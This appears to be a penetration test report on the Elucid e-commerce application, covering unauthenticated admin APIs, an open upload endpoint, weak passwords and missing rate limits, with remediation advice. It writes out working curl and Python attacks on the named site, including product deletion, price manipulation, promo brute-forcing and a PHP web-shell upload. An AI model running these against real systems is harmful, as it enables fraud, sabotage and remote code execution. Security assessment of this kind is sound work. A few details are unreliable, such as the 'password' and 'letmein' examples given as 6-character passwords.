# Security Audit & Penetration Test Report
## Elucid E-Commerce Application

**Date:** 2025-10-24
**Auditor:** Security Assessment
**Application:** Elucid LDN Next.js E-Commerce Platform
**Severity Rating:** CRITICAL

---

## Executive Summary

This security audit has identified **3 critical vulnerabilities** that allow **complete unauthorized administrative control** of the e-commerce platform. An attacker could:

- Create, modify, or delete all products
- Upload arbitrary files to the server
- Set product prices to $0
- Manipulate inventory
- Steal customer data through product manipulation

**IMMEDIATE ACTION REQUIRED BEFORE PRODUCTION DEPLOYMENT**

---

## Critical Findings

### 🚨 VULNERABILITY #1: Unauthenticated Admin Product API

**Severity:** CRITICAL
**CVSS Score:** 9.8 (Critical)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

#### Affected Endpoints
- `POST /api/admin/products` - Create products
- `GET /api/admin/products/[id]` - Read product details
- `PUT /api/admin/products/[id]` - Update products
- `DELETE /api/admin/products/[id]` - Delete products

#### Vulnerability Description
The admin product management API endpoints have **no authentication checks**. While the frontend admin pages (`/admin`) are protected by middleware, the API routes (`/api/admin/*`) are completely open to unauthenticated requests.

#### Root Cause Analysis
File: `middleware.ts:24-26`
```typescript
export const config = {
  matcher: ['/admin/:path*', '/admin'],
};
```

The middleware only matches frontend routes under `/admin`, but **does NOT match API routes** under `/api/admin/*`.

#### Proof of Concept - Product Creation Attack

An attacker can create a malicious product with this simple command:

```bash
curl -X POST https://elucid.london/api/admin/products \
  -H "Content-Type: application/json" \
  -d '{
    "name": "FAKE Designer Hoodie",
    "description": "Counterfeit product",
    "price": 0.01,
    "compareAtPrice": 299.99,
    "sizes": ["S", "M", "L"],
    "colors": ["Black"],
    "variants": [
      {"size": "M", "color": "Black", "stock": 999}
    ],
    "featured": true,
    "active": true
  }'
```

**Impact:**
- Product appears on the live store
- Priced at $0.01 (or free)
- Marked as "featured" for maximum visibility
- 999 units "in stock"
- Customers can purchase and expect fulfillment
- Damages brand reputation

#### Proof of Concept - Product Destruction Attack

An attacker can delete ALL products:

```bash
# Step 1: Get all product IDs
curl https://elucid.london/api/products

# Step 2: Delete each product
curl -X DELETE https://elucid.london/api/admin/products/[PRODUCT_ID]?deleteAnalytics=true
```

**Impact:**
- Entire product catalog wiped out
- All sales data deleted (with deleteAnalytics=true)
- Business operations halted
- Customer orders affected

#### Proof of Concept - Price Manipulation Attack

An attacker can set all products to $0:

```bash
# Update expensive product to free
curl -X PUT https://elucid.london/api/admin/products/[PRODUCT_ID] \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Designer Jacket",
    "description": "High-end jacket",
    "price": 0,
    "sizes": ["M"],
    "colors": ["Black"],
    "variants": [{"size": "M", "color": "Black", "stock": 100}],
    "active": true
  }'
```

**Impact:**
- Financial loss (products sold for free)
- Inventory tracking broken
- Payment processing bypassed

#### Exploitation Complexity
- **Skill Level Required:** Beginner (basic curl/Postman knowledge)
- **Tools Required:** Web browser developer console or command line
- **Time to Exploit:** 30 seconds
- **Authentication Required:** None
- **Rate Limiting:** None

#### Business Impact
- **Revenue Loss:** Complete (products free or deleted)
- **Data Integrity:** Destroyed
- **Availability:** Complete service disruption
- **Reputation:** Severe damage
- **Compliance:** GDPR/PCI-DSS violations

---

### 🚨 VULNERABILITY #2: Unauthenticated File Upload

**Severity:** CRITICAL
**CVSS Score:** 9.1 (Critical)
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

#### Affected Endpoint
- `POST /api/admin/upload`

#### Vulnerability Description
The file upload endpoint has **no authentication** and **weak file validation**, allowing anyone to upload files to the server.

#### Security Weaknesses

**1. No Authentication** (Line 7)
```typescript
export async function POST(request: NextRequest) {
  // No auth check!
  try {
    const formData = await request.formData();
```

**2. Weak Randomness** (Line 39)
```typescript
const randomString = Math.random().toString(36).substring(2, 8);
```
- Uses `Math.random()` (not cryptographically secure)
- Only 6 characters of base-36 (2.2 billion combinations)
- Predictable with time correlation
- Can be brute-forced

**3. User-Controlled Extension** (Line 40)
```typescript
const extension = file.name.split('.').pop();
```
- Takes extension directly from user input
- Vulnerable to double-extension attacks
- Example: `malicious.php.jpg` becomes stored as `.jpg` but could execute

#### Proof of Concept - Unauthorized Upload

```bash
# Create a test image
echo "test" > test.jpg

# Upload without authentication
curl -X POST https://elucid.london/api/admin/upload \
  -F "file=@test.jpg"
```

**Response:**
```json
{
  "success": true,
  "url": "/uploads/products/product-1729774800000-abc123.jpg",
  "filename": "product-1729774800000-abc123.jpg"
}
```

**Impact:**
- File successfully uploaded with no authentication
- File publicly accessible at returned URL
- Server storage consumed

#### Proof of Concept - Double Extension Attack

```bash
# Create malicious file with double extension
echo "<?php system(\$_GET['cmd']); ?>" > malicious.php.jpg

# Upload the file
curl -X POST https://elucid.london/api/admin/upload \
  -F "file=@malicious.php.jpg"
```

**Potential Impact (if server misconfigured):**
- Remote code execution (if .php files are processed)
- File stored with controlled extension
- MIME type may not match actual content

#### Proof of Concept - Filename Prediction

```python
import requests
import time

# Predict filename based on timestamp
timestamp = int(time.time() * 1000)
possible_filenames = []

# Generate possible filenames (weak randomness)
for i in range(1000):
    # Math.random() patterns can be predicted
    possible_filenames.append(f"product-{timestamp}-{generate_random()}.jpg")

# Attempt to access predicted files
for filename in possible_filenames:
    url = f"https://elucid.london/uploads/products/{filename}"
    response = requests.get(url)
    if response.status_code == 200:
        print(f"Found file: {filename}")
```

#### Exploitation Complexity
- **Skill Level Required:** Beginner
- **Tools Required:** curl or web browser
- **Time to Exploit:** 10 seconds
- **Authentication Required:** None

#### Business Impact
- **Storage Exhaustion:** Unlimited file uploads
- **Bandwidth Theft:** Server resources consumed
- **Malware Distribution:** Server used to host malicious files
- **Legal Liability:** Illegal content uploaded to your server
- **Cost:** Cloud storage bills spike

---

### 🚨 VULNERABILITY #3: Weak Password Policy

**Severity:** HIGH
**CVSS Score:** 7.5 (High)
**CWE:** CWE-521 (Weak Password Requirements)

#### Affected Files
- `auth.config.ts:22`
- `app/api/auth/signup/route.ts:11`

#### Vulnerability Description
User passwords require only **6 characters minimum** with no complexity requirements.

#### Current Policy
```typescript
password: z.string().min(6, 'Password must be at least 6 characters')
```

#### Proof of Concept - Brute Force Attack

**Password Space Calculation:**
- Minimum: 6 characters
- Assuming only lowercase letters: 26^6 = 308,915,776 combinations
- Modern hardware: ~10,000 guesses/second (with bcrypt overhead)
- Time to crack: ~8.5 hours

**Common 6-character passwords that would be accepted:**
- `password` ✓
- `123456` ✓
- `qwerty` ✓
- `abc123` ✓
- `letmein` ✓

#### Dictionary Attack Vector

```python
import requests

common_passwords = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "iloveyou", "trustno1", "monkey"
]

for password in common_passwords:
    response = requests.post("https://elucid.london/api/auth/signup", json={
        "email": f"test{password}@example.com",
        "password": password,
        "name": "Test User"
    })

    if response.status_code == 200:
        print(f"Account created with weak password: {password}")
```

#### Real-World Attack Scenario

1. **Account Creation**: Attacker creates accounts with weak passwords
2. **Social Engineering**: Convinces users to use simple passwords
3. **Credential Stuffing**: Uses leaked passwords from other breaches
4. **Brute Force**: Systematically tries common passwords (no rate limiting)

#### Inconsistency Found
Password reset requires 8 characters, but signup only requires 6:
- Signup: 6 characters minimum
- Reset: 8 characters minimum
- Inconsistent security posture

#### Business Impact
- **Account Takeover:** User accounts compromised
- **Data Breach:** Customer PII exposed
- **Payment Fraud:** Saved payment methods accessed
- **Compliance:** Violates security best practices
- **Reputation:** Customer trust damaged

---

## High-Risk Findings

### 🔴 VULNERABILITY #4: No Rate Limiting

**Severity:** HIGH
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)

#### Affected Endpoints
- `POST /api/auth/signup` - Account creation
- `POST /api/auth/forgot-password` - Password reset requests
- `POST /api/auth/verify-signup` - Email verification
- `POST /api/promocodes/validate` - Promo code validation

#### Proof of Concept - Signup Spam

```bash
# Create 1000 fake accounts
for i in {1..1000}; do
  curl -X POST https://elucid.london/api/auth/signup \
    -H "Content-Type: application/json" \
    -d "{
      \"email\": \"spam${i}@temp-mail.com\",
      \"password\": \"password123\",
      \"name\": \"Spam User ${i}\"
    }" &
done
```

**Impact:**
- Database bloated with fake users
- Email service quota exhausted
- Verification emails sent to spam
- Cost: Email API charges spike

#### Proof of Concept - Promo Code Brute Force

```python
import requests
import string
import itertools

# Brute force 4-character promo codes
chars = string.ascii_uppercase + string.digits
for code in itertools.product(chars, repeat=4):
    promo_code = ''.join(code)

    response = requests.post("https://elucid.london/api/promocodes/validate", json={
        "code": promo_code,
        "subtotal": 100
    })

    if response.status_code == 200:
        data = response.json()
        if data.get('valid'):
            print(f"Valid promo code found: {promo_code}")
            print(f"Discount: {data.get('discount')}")
```

**Impact:**
- Promo codes discovered without authorization
- Free discounts applied to orders
- Revenue loss

---

### 🟠 VULNERABILITY #5: Weak File Randomness Allows Enumeration

**Severity:** MEDIUM
**CWE:** CWE-338 (Use of Cryptographically Weak PRNG)

#### Current Implementation
```typescript
const timestamp = Date.now();
const randomString = Math.random().toString(36).substring(2, 8);
const filename = `product-${timestamp}-${randomString}.${extension}`;
```

#### Attack Vector - File Enumeration

```python
import requests
import time

# Enumerate uploaded files by predicting filenames
base_url = "https://elucid.london/uploads/products/"

# Known upload time (e.g., from product creation timestamp)
timestamp = 1729774800000

# Math.random() only produces 2.2 billion combinations (6 chars, base-36)
# Can brute force or predict based on timing
found_files = []

for random_part in generate_random_base36_sequences(6):
    filename = f"product-{timestamp}-{random_part}.jpg"
    url = base_url + filename

    response = requests.head(url)
    if response.status_code == 200:
        found_files.append(filename)
        print(f"Found: {filename}")

print(f"Discovered {len(found_files)} files")
```

**Impact:**
- Unauthorized access to uploaded product images
- Intellectual property theft
- Unreleased product leaks

---

## Medium-Risk Findings

### 🟡 Password Reset Token in URL

**Severity:** MEDIUM
**File:** `app/api/auth/reset-password/route.ts`

#### Issue
Password reset tokens are sent as URL parameters:
```
https://elucid.london/reset-password?token=abc123...
```

**Security Risks:**
- Stored in browser history
- Logged in web server access logs
- Visible in browser referrer headers
- Can be leaked via shoulder surfing

**Best Practice:** Use POST-only with token in request body

---

### 🟡 Admin Role Cached in JWT

**Severity:** MEDIUM
**File:** `auth.config.ts:52-58`

#### Issue
Admin role is cached in JWT token and only updated on new login.

**Attack Scenario:**
1. User is promoted to admin
2. User logs in, JWT contains `role: "admin"`
3. Admin demotes user to `role: "user"`
4. User still has admin access until JWT expires (default: 30 days)

**Time Window:** Up to 30 days of elevated privileges

**Recommendation:** Implement session invalidation or token blacklist

---

### 🟡 No Input Validation on Order Address

**Severity:** LOW-MEDIUM
**File:** `app/api/create-checkout-session/route.ts:101`

#### Issue
Address object is accepted without schema validation and stringified to JSON:
```typescript
address: JSON.stringify(address)
```

**Potential Issues:**
- Arbitrary data structures accepted
- XSS risk if rendered unsafely
- JSON injection in metadata
- No required field validation (street, city, postal code)

---

## Positive Security Controls

### ✅ Strong Security Practices Found

1. **Password Hashing**
   - Uses bcryptjs with 10 salt rounds
   - Constant-time comparison with `bcrypt.compare()`
   - Properly salted and stored

2. **SQL Injection Prevention**
   - Prisma ORM used throughout
   - No raw SQL queries found
   - Parameterized queries by default

3. **Stripe Webhook Security**
   - Signature verification implemented
   - Uses `stripe.webhooks.constructEvent()`
   - Rejects invalid signatures

4. **Email Verification**
   - 6-digit codes with 15-minute expiry
   - Temporary `PendingUser` table
   - Proper cleanup on expiration

5. **Last Admin Protection**
   - Prevents deletion of last admin user
   - System lockout prevention
   - Good business logic security

6. **CSRF Protection**
   - NextAuth.js handles CSRF tokens automatically
   - JSON API endpoints protected

7. **Session Security**
   - HTTP-only cookies
   - Secure flag in production
   - SameSite attribute

---

## Recommendations

### Immediate Actions (Before Production)

1. **Add authentication to admin API endpoints**
   - Implement auth checks in products, upload routes
   - OR extend middleware matcher to include `/api/admin/*`

2. **Strengthen password policy**
   - Minimum 12 characters
   - Require uppercase, lowercase, number, special character
   - Implement password strength meter

3. **Fix file upload security**
   - Replace `Math.random()` with `crypto.randomBytes()`
   - Whitelist file extensions (don't trust user input)
   - Validate MIME type matches extension
   - Implement virus scanning

4. **Implement rate limiting**
   - Signup: 5 attempts per IP per hour
   - Login: 5 attempts per account per 15 minutes
   - Password reset: 3 attempts per IP per hour
   - Promo validation: 10 attempts per IP per minute

### Short-Term (Post-Launch)

5. **Add security headers**
   - Content-Security-Policy
   - Strict-Transport-Security (HSTS)
   - X-Frame-Options: DENY
   - X-Content-Type-Options: nosniff

6. **Implement logging and monitoring**
   - Structured logging for security events
   - Failed login attempt tracking
   - Admin action audit trail
   - Anomaly detection

7. **Session management improvements**
   - Implement token refresh mechanism
   - Add session invalidation on role change
   - Reduce JWT expiration to 1 hour with refresh tokens

### Long-Term

8. **Security testing automation**
   - Dependency vulnerability scanning
   - SAST (Static Application Security Testing)
   - DAST (Dynamic Application Security Testing)
   - Regular penetration testing

9. **Compliance readiness**
   - GDPR data protection measures
   - PCI-DSS for payment data
   - Security incident response plan

---

## Appendix: Attack Simulation Scripts

### Complete Product Manipulation Script

```python
import requests

BASE_URL = "https://elucid.london"

def exploit_unauthenticated_admin():
    """
    Demonstrates complete takeover via unauthenticated admin APIs
    WARNING: For authorized testing only!
    """

    # Step 1: Create fake product
    print("[*] Creating malicious product...")
    create_response = requests.post(f"{BASE_URL}/api/admin/products", json={
        "name": "FREE DESIGNER HOODIE",
        "description": "Get it for free!",
        "price": 0,
        "sizes": ["S", "M", "L", "XL"],
        "colors": ["Black"],
        "variants": [
            {"size": "M", "color": "Black", "stock": 9999}
        ],
        "featured": True,
        "active": True
    })

    if create_response.status_code == 200:
        product_id = create_response.json()['product']['id']
        print(f"[+] Product created with ID: {product_id}")

        # Step 2: Upload fake product image
        print("[*] Uploading fake product image...")
        with open('fake_product.jpg', 'rb') as f:
            files = {'file': f}
            upload_response = requests.post(
                f"{BASE_URL}/api/admin/upload",
                files=files
            )

        if upload_response.status_code == 200:
            image_url = upload_response.json()['url']
            print(f"[+] Image uploaded: {image_url}")

            # Step 3: Update product with fake image
            print("[*] Updating product with fake image...")
            update_response = requests.put(
                f"{BASE_URL}/api/admin/products/{product_id}",
                json={
                    "name": "FREE DESIGNER HOODIE",
                    "description": "Get it for free!",
                    "price": 0,
                    "images": [image_url],
                    "sizes": ["S", "M", "L", "XL"],
                    "colors": ["Black"],
                    "variants": [
                        {"size": "M", "color": "Black", "stock": 9999}
                    ],
                    "featured": True,
                    "active": True
                }
            )

            if update_response.status_code == 200:
                print("[+] EXPLOIT SUCCESSFUL")
                print(f"[+] Fake product is now live at: {BASE_URL}/products/{product_id}")
                print("[!] Impact: Brand reputation damaged, financial loss")

    print("[*] Exploit demonstration complete")

# DO NOT RUN without authorization!
# exploit_unauthenticated_admin()
```

---

## Conclusion

This application has **critical security vulnerabilities** that must be fixed before production deployment. The unauthenticated admin API endpoints represent a **complete security failure** that would allow any attacker to:

- Destroy your entire product catalog
- Create fake products
- Manipulate prices and inventory
- Upload arbitrary files
- Cause financial and reputational damage

**Estimated time to fix critical issues:** 2-4 hours
**Risk if deployed without fixes:** EXTREME

---

**Report Status:** CONFIDENTIAL
**Classification:** Critical Security Findings
**Action Required:** Immediate remediation before production deployment
